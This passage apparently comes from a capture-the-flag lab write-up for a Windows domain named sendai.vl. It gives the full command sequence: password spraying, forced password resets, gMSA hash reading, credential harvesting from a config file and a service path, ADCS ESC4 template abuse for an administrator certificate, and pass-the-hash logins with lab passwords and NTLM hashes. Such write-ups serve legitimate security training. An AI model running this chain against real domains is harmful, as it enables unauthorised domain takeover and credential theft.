  ..                                 DR        0  Tue Jul 11 03:36:58 2023
  desktop.ini                       AHS      174  Sat May  8 04:18:31 2021

\Public\Libraries
  .                                 DHR        0  Sat May  8 04:34:49 2021
  ..                                 DR        0  Tue Jul 11 03:36:58 2023
  desktop.ini                       AHS      175  Sat May  8 04:18:31 2021
  RecordedTV.library-ms               A      999  Sat May  8 04:18:31 2021

\Public\Music
  .                                  DR        0  Sat May  8 04:20:26 2021
  ..                                 DR        0  Tue Jul 11 03:36:58 2023
  desktop.ini                       AHS      380  Sat May  8 04:18:31 2021

\Public\Pictures
  .                                  DR        0  Sat May  8 04:20:26 2021
  ..                                 DR        0  Tue Jul 11 03:36:58 2023
  desktop.ini                       AHS      380  Sat May  8 04:18:31 2021

\Public\Videos
  .                                  DR        0  Sat May  8 04:20:26 2021
  ..                                 DR        0  Tue Jul 11 03:36:58 2023
  desktop.ini                       AHS      380  Sat May  8 04:18:31 2021

\Default\AppData\Local
  .                                   D        0  Tue Jul 11 12:36:32 2023
  ..                                 DH        0  Sat May  8 04:20:24 2021
  Microsoft                           D        0  Sat May  8 04:34:49 2021
  Temp                                D        0  Sat May  8 04:20:24 2021

\Default\AppData\Roaming
  .                                   D        0  Sat May  8 04:34:59 2021
  ..                                 DH        0  Sat May  8 04:20:24 2021
  Microsoft                          DS        0  Sat May  8 04:34:59 2021

\Default\AppData\Local\Microsoft
  .                                   D        0  Sat May  8 04:34:49 2021
  ..                                  D        0  Tue Jul 11 12:36:32 2023
  InputPersonalization                D        0  Sat May  8 04:34:49 2021
  Windows                             D        0  Wed Jul 19 10:09:23 2023
  Windows Sidebar                   DHS        0  Sat May  8 04:20:26 2021

\Default\AppData\Local\Temp
  .                                   D        0  Sat May  8 04:20:24 2021
  ..                                  D        0  Tue Jul 11 12:36:32 2023

\Default\AppData\Roaming\Microsoft
  .                                  DS        0  Sat May  8 04:34:59 2021
  ..                                  D        0  Sat May  8 04:34:59 2021
  Internet Explorer                   D        0  Sat May  8 04:34:59 2021
  Windows                             D        0  Sat May  8 04:34:49 2021

\Default\AppData\Local\Microsoft\InputPersonalization
  .                                   D        0  Sat May  8 04:34:49 2021
  ..                                  D        0  Sat May  8 04:34:49 2021
  TrainedDataStore                   Dn        0  Sat May  8 04:20:24 2021

\Default\AppData\Local\Microsoft\Windows
  .                                   D        0  Wed Jul 19 10:09:23 2023
  ..                                  D        0  Sat May  8 04:34:49 2021
  CloudStore                          D        0  Sat May  8 04:20:24 2021
  GameExplorer                       Dn        0  Sat May  8 04:20:24 2021
  History                            DS        0  Sat May  8 04:20:24 2021
  INetCache                         DSn        0  Sat May  8 04:20:24 2021
  INetCookies                       DSn        0  Sat May  8 04:20:24 2021
  PowerShell                          D        0  Wed Jul 19 10:09:31 2023
  Shell                               D        0  Tue Apr 15 23:20:35 2025
  WinX                                D        0  Sat May  8 04:20:24 2021

\Default\AppData\Local\Microsoft\Windows Sidebar
  .                                 DHS        0  Sat May  8 04:20:26 2021
  ..                                  D        0  Sat May  8 04:34:49 2021
  Gadgets                             D        0  Sat May  8 04:20:24 2021
  settings.ini                        A       80  Sat May  8 04:18:31 2021

\Default\AppData\Roaming\Microsoft\Internet Explorer
  .                                   D        0  Sat May  8 04:34:59 2021
  ..                                 DS        0  Sat May  8 04:34:59 2021
  Quick Launch                       DR        0  Sat May  8 04:20:35 2021

\Default\AppData\Roaming\Microsoft\Windows
  .                                   D        0  Sat May  8 04:34:49 2021
  ..                                 DS        0  Sat May  8 04:34:59 2021
  CloudStore                          D        0  Sat May  8 04:20:24 2021
  Network Shortcuts                  Dn        0  Sat May  8 04:20:24 2021
  Printer Shortcuts                  Dn        0  Sat May  8 04:20:24 2021
  Recent                             DR        0  Sat May  8 04:20:24 2021
  SendTo                            DRn        0  Sat May  8 04:34:49 2021
  Start Menu                         DR        0  Sat May  8 04:20:24 2021
  Templates                          Dn        0  Sat May  8 04:20:24 2021

\Default\AppData\Local\Microsoft\InputPersonalization\TrainedDataStore
  .                                  Dn        0  Sat May  8 04:20:24 2021
  ..                                  D        0  Sat May  8 04:34:49 2021

\Default\AppData\Local\Microsoft\Windows\CloudStore
  .                                   D        0  Sat May  8 04:20:24 2021
  ..                                  D        0  Wed Jul 19 10:09:23 2023

\Default\AppData\Local\Microsoft\Windows\GameExplorer
  .                                  Dn        0  Sat May  8 04:20:24 2021
  ..                                  D        0  Wed Jul 19 10:09:23 2023

\Default\AppData\Local\Microsoft\Windows\History
  .                                  DS        0  Sat May  8 04:20:24 2021
  ..                                  D        0  Wed Jul 19 10:09:23 2023

\Default\AppData\Local\Microsoft\Windows\INetCache
  .                                 DSn        0  Sat May  8 04:20:24 2021
  ..                                  D        0  Wed Jul 19 10:09:23 2023

\Default\AppData\Local\Microsoft\Windows\INetCookies
  .                                 DSn        0  Sat May  8 04:20:24 2021
  ..                                  D        0  Wed Jul 19 10:09:23 2023

\Default\AppData\Local\Microsoft\Windows\PowerShell
  .                                   D        0  Wed Jul 19 10:09:31 2023
  ..                                  D        0  Wed Jul 19 10:09:23 2023
  StartupProfileData-Interactive      A    25308  Wed Jul 19 10:09:31 2023

\Default\AppData\Local\Microsoft\Windows\Shell
  .                                   D        0  Tue Apr 15 23:20:35 2025
  ..                                  D        0  Wed Jul 19 10:09:23 2023
  DefaultLayouts.xml                  A    64223  Tue Apr 15 23:16:11 2025

\Default\AppData\Local\Microsoft\Windows\WinX
  .                                   D        0  Sat May  8 04:20:24 2021
  ..                                  D        0  Wed Jul 19 10:09:23 2023
  Group1                             DR        0  Sat May  8 04:20:35 2021
  Group2                             DR        0  Sat May  8 04:20:35 2021
  Group3                             DR        0  Sat May  8 04:20:35 2021

\Default\AppData\Local\Microsoft\Windows Sidebar\Gadgets
  .                                   D        0  Sat May  8 04:20:24 2021
  ..                                DHS        0  Sat May  8 04:20:26 2021

\Default\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch
  .                                  DR        0  Sat May  8 04:20:35 2021
  ..                                  D        0  Sat May  8 04:34:59 2021
  Control Panel.lnk                   A     1259  Sat May  8 04:15:33 2021
  desktop.ini                       AHS      270  Sat May  8 04:18:35 2021
  Server Manager.lnk                  A     1158  Sat May  8 04:15:33 2021
  Shows Desktop.lnk                   A      352  Sat May  8 04:14:58 2021
  Window Switcher.lnk                 A      334  Sat May  8 04:14:58 2021

\Default\AppData\Roaming\Microsoft\Windows\CloudStore
  .                                   D        0  Sat May  8 04:20:24 2021
  ..                                  D        0  Sat May  8 04:34:49 2021

\Default\AppData\Roaming\Microsoft\Windows\Network Shortcuts
  .                                  Dn        0  Sat May  8 04:20:24 2021
  ..                                  D        0  Sat May  8 04:34:49 2021

\Default\AppData\Roaming\Microsoft\Windows\Printer Shortcuts
  .                                  Dn        0  Sat May  8 04:20:24 2021
  ..                                  D        0  Sat May  8 04:34:49 2021

\Default\AppData\Roaming\Microsoft\Windows\Recent
  .                                  DR        0  Sat May  8 04:20:24 2021
  ..                                  D        0  Sat May  8 04:34:49 2021

\Default\AppData\Roaming\Microsoft\Windows\SendTo
  .                                 DRn        0  Sat May  8 04:34:49 2021
  ..                                  D        0  Sat May  8 04:34:49 2021
  Compressed (zipped) Folder.ZFSendToTarget      A        3  Sat May  8 04:18:31 2021
  Desktop (create shortcut).DeskLink      A        7  Sat May  8 04:18:31 2021
  Desktop.ini                       AHS      440  Sat May  8 04:18:31 2021
  Mail Recipient.MAPIMail             A        4  Sat May  8 04:18:31 2021

\Default\AppData\Roaming\Microsoft\Windows\Start Menu
  .                                  DR        0  Sat May  8 04:20:24 2021
  ..                                  D        0  Sat May  8 04:34:49 2021
  Programs                            D        0  Sat May  8 04:34:49 2021

\Default\AppData\Roaming\Microsoft\Windows\Templates
  .                                  Dn        0  Sat May  8 04:20:24 2021
  ..                                  D        0  Sat May  8 04:34:49 2021

\Default\AppData\Local\Microsoft\Windows\WinX\Group1
  .                                  DR        0  Sat May  8 04:20:35 2021
  ..                                  D        0  Sat May  8 04:20:24 2021
  1 - Desktop.lnk                     A     1109  Sat May  8 04:14:58 2021
  desktop.ini                       AHS       75  Sat May  8 04:18:35 2021

\Default\AppData\Local\Microsoft\Windows\WinX\Group2
  .                                  DR        0  Sat May  8 04:20:35 2021
  ..                                  D        0  Sat May  8 04:20:24 2021
  1 - Run.lnk                         A     1109  Sat May  8 04:14:58 2021
  2 - Search.lnk                      A     1109  Sat May  8 04:14:58 2021
  3 - Windows Explorer.lnk            A     1109  Sat May  8 04:14:58 2021
  4 - Control Panel.lnk               A     1492  Sat May  8 04:14:58 2021
  5 - Task Manager.lnk                A     1021  Sat May  8 04:14:58 2021
  desktop.ini                       AHS      325  Sat May  8 04:18:35 2021

\Default\AppData\Local\Microsoft\Windows\WinX\Group3
  .                                  DR        0  Sat May  8 04:20:35 2021
  ..                                  D        0  Sat May  8 04:20:24 2021
  01 - Command Prompt.lnk             A     1015  Sat May  8 04:14:58 2021
  01a - Windows PowerShell.lnk        A     1127  Sat May  8 04:14:58 2021
  02 - Command Prompt.lnk             A     1059  Sat May  8 04:14:58 2021
  02a - Windows PowerShell.lnk        A     1171  Sat May  8 04:14:58 2021
  03 - Computer Management.lnk        A     1015  Sat May  8 04:14:58 2021
  04 - Disk Management.lnk            A     1015  Sat May  8 04:14:58 2021
  04-1 - NetworkStatus.lnk            A     1582  Sat May  8 04:14:58 2021
  05 - Device Manager.lnk             A     1075  Sat May  8 04:14:58 2021
  06 - SystemAbout.lnk                A     1576  Sat May  8 04:14:58 2021
  07 - Event Viewer.lnk               A     1015  Sat May  8 04:14:58 2021
  08 - PowerAndSleep.lnk              A     1578  Sat May  8 04:14:58 2021
  09 - Mobility Center.lnk            A     1015  Sat May  8 04:14:58 2021
  10 - AppsAndFeatures.lnk            A     1578  Sat May  8 04:14:58 2021
  desktop.ini                       AHS      941  Sat May  8 04:18:35 2021

\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
  .                                   D        0  Sat May  8 04:34:49 2021
  ..                                 DR        0  Sat May  8 04:20:24 2021
  Accessibility                      DR        0  Mon Aug 18 08:04:47 2025
  Accessories                         D        0  Sat May  8 04:20:26 2021
  Maintenance                         D        0  Sat May  8 04:20:26 2021
  Startup                             D        0  Thu Jul 20 04:39:32 2023
  System Tools                       DR        0  Sat May  8 04:20:26 2021

\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessibility
  .                                  DR        0  Mon Aug 18 08:04:47 2025
  ..                                  D        0  Sat May  8 04:34:49 2021
  desktop.ini                       AHS      568  Mon Aug 18 08:01:17 2025
  Magnify.lnk                         A     1106  Sat May  8 04:14:19 2021
  Narrator.lnk                        A     1108  Sat May  8 04:14:19 2021
  On-Screen Keyboard.lnk              A     1106  Sat May  8 04:14:19 2021

\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Accessories
  .                                   D        0  Sat May  8 04:20:26 2021
  ..                                  D        0  Sat May  8 04:34:49 2021
  Desktop.ini                       AHS      170  Sat May  8 04:18:31 2021

\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Maintenance
  .                                   D        0  Sat May  8 04:20:26 2021
  ..                                  D        0  Sat May  8 04:34:49 2021
  Desktop.ini                       AHS      170  Sat May  8 04:18:31 2021

\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
  .                                   D        0  Thu Jul 20 04:39:32 2023
  ..                                  D        0  Sat May  8 04:34:49 2021
  setwallpaper.lnk                    A     1365  Sun Sep 29 08:48:39 2024

\Default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\System Tools
  .                                  DR        0  Sat May  8 04:20:26 2021
  ..                                  D        0  Sat May  8 04:34:49 2021
  Administrative Tools.lnk            A     1281  Sat May  8 04:14:58 2021
  Command Prompt.lnk                  A     1142  Sat May  8 04:14:16 2021
  computer.lnk                        A      335  Sat May  8 04:14:58 2021
  Control Panel.lnk                   A      405  Sat May  8 04:14:58 2021
  Desktop.ini                       AHS      934  Sat May  8 04:18:35 2021
  File Explorer.lnk                   A      407  Sat May  8 04:14:58 2021
  Run.lnk                             A      409  Sat May  8 04:14:58 2021

		7019007 blocks of size 4096. 1154763 blocks available

```
- Download the incident.txt file from `sendai` share
```
$ cat incident.txt 
Dear valued employees,

We hope this message finds you well. We would like to inform you about an important security update regarding user account passwords. Recently, we conducted a thorough penetration test, which revealed that a significant number of user accounts have weak and insecure passwords.

To address this concern and maintain the highest level of security within our organization, the IT department has taken immediate action. All user accounts with insecure passwords have been expired as a precautionary measure. This means that affected users will be required to change their passwords upon their next login.

We kindly request all impacted users to follow the password reset process promptly to ensure the security and integrity of our systems. Please bear in mind that strong passwords play a crucial role in safeguarding sensitive information and protecting our network from potential threats.

If you need assistance or have any questions regarding the password reset procedure, please don't hesitate to reach out to the IT support team. They will be more than happy to guide you through the process and provide any necessary support.

Thank you for your cooperation and commitment to maintaining a secure environment for all of us. Your vigilance and adherence to robust security practices contribute significantly to our collective safety.
```
- We find a list of users in transfer folder in `sendai` SMB share
```
anthony.smith
clifford.davey
elliot.yates
lisa.williams 
susan.harper       
thomas.powell 
```
## Foothold

#### Steps
- According to the `incident.txt` some users have weak passwords 
- Attempt to spray without password with the users gathered
```
$nxc smb 10.129.1.135 -u users -p ''
SMB         10.129.1.135    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.1.135    445    DC               [-] sendai.vl\anthony.smith: STATUS_LOGON_FAILURE
SMB         10.129.1.135    445    DC               [-] sendai.vl\clifford.davey: STATUS_LOGON_FAILURE
SMB         10.129.1.135    445    DC               [-] sendai.vl\elliot.yates: STATUS_PASSWORD_MUST_CHANGE
SMB         10.129.1.135    445    DC               [-] sendai.vl\lisa.williams: STATUS_LOGON_FAILURE
SMB         10.129.1.135    445    DC               [-] sendai.vl\susan.harper: STATUS_LOGON_FAILURE
SMB         10.129.1.135    445    DC               [-] sendai.vl\thomas.powell: STATUS_PASSWORD_MUST_CHANGE
```
- Found two users with password must change error
```
thomas.powell, elliot.yates 
```
- Change the password of the users 
```
$changepasswd.py 'sendai.vl/thomas.powell@10.129.1.135' -newpass 'Password@987' -p rpc-samr
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

Current password:
[*] Changing the password of sendai.vl\thomas.powell
[*] Connecting to DCE/RPC as sendai.vl\thomas.powell
[*] Password was changed successfully.
```

```
$changepasswd.py 'sendai.vl/elliot.yates@10.129.1.135' -newpass 'Password@987' -p rpc-samr
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

Current password:
[*] Changing the password of sendai.vl\elliot.yates
[*] Connecting to DCE/RPC as sendai.vl\elliot.yates
[*] Password was changed successfully.
```
- Verify the new password
```
$nxc smb 10.129.1.135 -u elliot.yates -p Password@987
SMB         10.129.1.135    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.1.135    445    DC               [+] sendai.vl\elliot.yates:Password@987
```

```
$nxc smb 10.129.1.135 -u thomas.powell -p Password@987
SMB         10.129.1.135    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.1.135    445    DC               [+] sendai.vl\thomas.powell:Password@987
```
- Run bloodhound with one of the users 
```
$bloodhound-ce-python -u 'thomas.powell' -p 'Password@987' -d sendai.vl --zip -c All -dc dc.sendai.vl -ns 10.129.1.135
```
- Enumerate target domain and found a chain of attack from `thomas.powell` to `MGTSVC`
![[Pasted image 20260708161152.png]]
- First add user to the `ADMSVC` group
```
$bloodyAD -u 'thomas.powell' -p 'Password@987' -d sendai.vl --host 10.129.1.135 add groupMember 'ADMSVC' thomas.powell
[+] thomas.powell added to ADMSVC
```
- Read GMSA password using `nxc`
```
$nxc ldap 10.129.1.135 -u thomas.powell -p Password@987 --gmsa
LDAP        10.129.1.135    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:sendai.vl) (signing:None) (channel binding:Never)
LDAP        10.129.1.135    389    DC               [+] sendai.vl\thomas.powell:Password@987
LDAP        10.129.1.135    389    DC               [*] Getting GMSA Passwords
LDAP        10.129.1.135    389    DC               Account: mgtsvc$              NTLM: 04916851945671b02a176029fac231ba     PrincipalsAllowedToReadPassword: admsvc
```
- Obtain remote access via `evil-winrm`
```
$evil-winrm -i 10.129.1.135 -u 'mgtsvc$' -H 04916851945671b02a176029fac231ba
```
## Lateral Movement 

#### Steps
- Enumerate the target file system 
- Found user password in `.sqlconfig` file
```
*Evil-WinRM* PS C:\config> ls


    Directory: C:\config


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         7/11/2023   5:57 AM             78 .sqlconfig


*Evil-WinRM* PS C:\config> cat .sqlconfig
Server=dc.sendai.vl,1433;Database=prod;User Id=sqlsvc;Password=SurenessBlob85;
```
- Enumerate the processes running 
- Found a interesting process named `helpdesk`
```
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> Get-Process

Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    119       9     4760       1220              3924   0 AggregatorHost
      4       1      376       1032              5176   0 AWSAcpiSpcrReader
    399      36    12884        508              2628   0 certsrv
     81       6     2280          0              3500   0 cmd
    154      11     6712       1472              3552   0 conhost
    581      24     2168        588               432   0 csrss
    176      12     1908          0               540   1 csrss
    424      35    16888       6704              2752   0 dfsrs
    198      13     2352        128              3276   0 dfssvc
    282      15     3936        488              3576   0 dllhost
  10389    7470   129872       2372              2320   0 dns
    639      26    19340       9856              1152   1 dwm
    175      18    23324       5144              4968   0 EC2Launch
     72       6      804          0              3180   0 EC2LaunchService
     39       7     1376          0              4848   0 fontdrvhost
     39       7     1536          0              4856   1 fontdrvhost
    188      12    12276        764              3172   0 helpdesk
<SNIP>

```
- Attempt to fetch command line input to the service 
```
*Evil-WinRM* PS C:\Users\mgtsvc$\Documents> Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services | Get-ItemProperty | Select-Object ImagePath | Select-String helpdesk

@{ImagePath=C:\WINDOWS\helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p -k netsvcs}
```
- Breaking down the command 

| `Get-ChildItem -Path HKLM:\SYSTEM\CurrentControlSet\services` | Lists all **subkeys** under the `services` registry key. Each subkey represents a Windows service (e.g., `wuauserv`, `MpsSvc`). |
| ------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------- |
| `\| Get-ItemProperty`                                         | For each service subkey, retrieves all its registry values (like `ImagePath`, `DisplayName`, `Start`, etc.).                    |
| `\| Select-Object ImagePath`                                  | Filters the output to show **only** the `ImagePath` property (the command line that starts the service).                        |
```
helpdesk.exe -u clifford.davey -p RFmoB2WplgE_3p
```
- Verify the credential 
```
$nxc smb 10.129.1.135 -u clifford.davey -p RFmoB2WplgE_3p
SMB         10.129.1.135    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:sendai.vl) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.1.135    445    DC               [+] sendai.vl\clifford.davey:RFmoB2WplgE_3p
```
## Privilege Escalation

#### Steps
- Enumerate ADCS 
```
$certipy-ad find -u clifford.davey -p RFmoB2WplgE_3p -dc-ip 10.129.1.135 -st
dout -vulnerable
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 34 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 16 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'sendai-DC-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'sendai-DC-CA'
[*] Checking web enrollment for CA 'sendai-DC-CA' @ 'dc.sendai.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : sendai-DC-CA
    DNS Name                            : dc.sendai.vl
    Certificate Subject                 : CN=sendai-DC-CA, DC=sendai, DC=vl
    Certificate Serial Number           : 326E51327366FC954831ECD5C04423BE
    Certificate Validity Start          : 2023-07-11 09:19:29+00:00
    Certificate Validity End            : 2123-07-11 09:29:29+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : SENDAI.VL\Administrators
      Access Rights
        ManageCa                        : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        ManageCertificates              : SENDAI.VL\Administrators
                                          SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
        Enroll                          : SENDAI.VL\Authenticated Users
Certificate Templates
  0
    Template Name                       : SendaiComputer
    Display Name                        : SendaiComputer
    Certificate Authorities             : sendai-DC-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireDns
    Enrollment Flag                     : AutoEnrollment
    Extended Key Usage                  : Server Authentication
                                          Client Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 100 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 4096
    Template Created                    : 2023-07-11T12:46:12+00:00
    Template Last Modified              : 2023-07-11T12:46:19+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
      Object Control Permissions
        Owner                           : SENDAI.VL\Administrator
        Full Control Principals         : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Owner Principals          : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Dacl Principals           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Enterprise Admins
                                          SENDAI.VL\ca-operators
        Write Property Enroll           : SENDAI.VL\Domain Admins
                                          SENDAI.VL\Domain Computers
                                          SENDAI.VL\Enterprise Admins
    [+] User Enrollable Principals      : SENDAI.VL\ca-operators
                                          SENDAI.VL\Domain Computers
    [+] User ACL Principals             : SENDAI.VL\ca-operators
    [!] Vulnerabilities
      ESC4                              : User has dangerous permissions.
```
- Identified ESC4 vulnerability on target domain 
- Search online and found an article on ESC4, https://medium.com/r3d-buck3t/adcs-attack-series-abusing-esc4-via-template-acls-for-privilege-escalation-98320f0da59a
- First save the old template
```
$certipy-ad template -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.1.135 -template SendaiComputer
-save-configuration ESC4-original

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'ESC4-original.json'
[*] Wrote current configuration for 'SendaiComputer' to 'ESC4-original.json'
```
- Second Modify the template, to make it vulnerable to ESC1
```
$certipy-ad template -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -dc-ip 10.129.1.135 -template SendaiComputer
-write-default-configuration

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Saving current configuration to 'SendaiComputer.json'
[*] Wrote current configuration for 'SendaiComputer' to 'SendaiComputer.json'
[*] Updating certificate template 'SendaiComputer'
[*] Replacing:
[*]     nTSecurityDescriptor: b'\x01\x00\x04\x9c0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x02\x00\x1c\x00\x01\x00\x00\x00\x00\x00\x14\x00\xff\x01\x0f\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00\x01\x01\x00\x00\x00\x00\x00\x05\x0b\x00\x00\x00'
[*]     flags: 66104
[*]     pKIDefaultKeySpec: 2
[*]     pKIKeyUsage: b'\x86\x00'
[*]     pKIMaxIssuingDepth: -1
[*]     pKICriticalExtensions: ['2.5.29.19', '2.5.29.15']
[*]     pKIExpirationPeriod: b'\x00@9\x87.\xe1\xfe\xff'
[*]     pKIExtendedKeyUsage: ['1.3.6.1.5.5.7.3.2']
[*]     pKIDefaultCSPs: ['2,Microsoft Base Cryptographic Provider v1.0', '1,Microsoft Enhanced Cryptographic Provider v1.0']
[*]     msPKI-Enrollment-Flag: 0
[*]     msPKI-Private-Key-Flag: 16
[*]     msPKI-Certificate-Name-Flag: 1
[*]     msPKI-Minimal-Key-Size: 2048
[*]     msPKI-Certificate-Application-Policy: ['1.3.6.1.5.5.7.3.2']
Are you sure you want to apply these changes to 'SendaiComputer'? (y/N): y
[*] Successfully updated 'SendaiComputer'
```
- Request certificate as privileged user
```
$certipy-ad req -u 'clifford.davey' -p 'RFmoB2WplgE_3p' -ca 'sendai-DC-CA' -dc-ip 10.129.1.135 -upn admini
strator -target 'dc.sendai.vl' -template SENDAICOMPUTER -sid 'S-1-5-21-3085872742-570972823-736764132-500'

Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 8
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate object SID is 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```
- Obtain the hash of the impersonated account 
```
$certipy-ad auth -u administrator -domain sendai.vl -dc-ip 10.129.1.135 -ns 10.129.1.135 -pfx administrato
r.pfx
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*]     SAN URL SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*]     Security Extension SID: 'S-1-5-21-3085872742-570972823-736764132-500'
[*] Using principal: 'administrator@sendai.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@sendai.vl': aad3b435b51404eeaad3b435b51404ee:cfb106feec8b89a3d98e14dcbe8d087a
```
- Obtain remote access via `evil-winrm`
```
evil-winrm -i dc.sendai.vl -u 'administrator' -H 'cfb106feec8b89a3d98e14dcbe8d087a'
```
## Lessons Learned
- Attack family: ADCS Exploits
- Key takeaway: ESC4 Exploit

## Resources
- References: